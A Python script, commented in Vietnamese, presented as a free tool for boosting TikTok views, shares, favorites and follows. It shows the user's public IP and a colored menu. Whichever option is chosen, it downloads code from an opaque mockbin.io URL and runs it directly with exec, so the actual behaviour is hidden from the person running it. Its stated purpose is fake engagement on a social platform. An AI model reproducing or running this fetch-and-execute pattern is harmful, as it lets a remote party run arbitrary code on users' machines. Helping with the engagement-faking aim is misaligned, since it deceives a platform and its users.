import sys
from datetime import datetime
import requests
import socket
import os
from time import sleep
from datetime import date

# Lấy địa chỉ IP từ URL
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = response.text.strip()  # Chỉ cần lấy nội dung trả về từ API
    return ip_address

# URL của API lấy IP
url = "https://api64.ipify.org?format=text"
ip = get_ip_from_url(url)

# Thời gian hiện tại
time = datetime.now().strftime("%H:%M:%S")
today = date.today()
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
#đánh dấu bản quyền
import os, sys, requests
from time import sleep
from pystyle import *
from time import strftime
from datetime import datetime, timedelta
now=datetime.now()
os.system("cls" if os.name == "nt" else "clear")
sleep(1)
banner="""
\033[1;32m╔══════════════════════════════════════════════╗
\033[1;32m║   \033[1;31mLoại Tool : \033[1;33mMiễn Phí
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;31mLiên Hệ Facebook : \033[1;33mfb.com/manhquyen10112004
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;31mLiên Hệ Tik Tok : \033[1;33mthomas_lee_
\033[1;32m╚══════════════════════════════════════════════╝
\033[1;31m
\033[1;31m  ████████╗██╗  ██╗ ██████╗ ███╗   ███╗ █████╗ ███████╗    
\033[1;34m  ╚══██╔══╝██║  ██║██╔═══██╗████╗ ████║██╔══██╗██╔════╝    
\033[1;33m     ██║   ███████║██║   ██║██╔████╔██║███████║███████╗    
\033[1;32m     ██║   ██╔══██║██║   ██║██║╚██╔╝██║██╔══██║╚════██║    
\033[1;35m     ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║███████║    
\033[1;36m     ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝  
\033[1;31m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
"""
for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00)
print(f"{xduong}█ {hong}Ngày{trang} : {vang}{ngay_hom_nay}{xduong} |{hong} Tháng{trang}: {vang}{thang_nay} {xduong}| {hong}Năm{trang}: {vang}{nam_}{xduong} | {hong}Thời Gian: {vang}{time}")
print(f'{xduong}█ {hong}Địa Chỉ IP Của Bạn : {vang}{ip}')

print("\033[1;31m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")

print(" \033[1;37m╔═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức Năng [1] \033[1;36mBuff Tik Tok [\033[1;33mView\033[1;36m][\033[1;33mShare\033[1;36m][\033[1;33mFavorites\033[1;36m]")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")   
print("\033[1;32m ║ ➢Chức năng [2] \033[1;36mBuff Tik Tok [\033[1;33mFollow\033[1;36m][\033[1;33mVip\033[1;36m]")
print(" \033[1;37m╚═════════════════════════════════════════════════════════════")
chon = int(input('\033[1;31m[\033[1;37m[=.=]\033[1;31m] \033[1;37m=> \033[1;32mChọn chức năng \033[1;37m: \033[1;35m'))

if chon == 1 :

	exec(requests.get('https://e8adf4a3ae4a4757a813f9ac589a9661.api.mockbin.io/').text)

if chon == 2 :

	exec(requests.get('https://e2f4d9583ff84af185fc96255185e168.api.mockbin.io/').text)

	exit()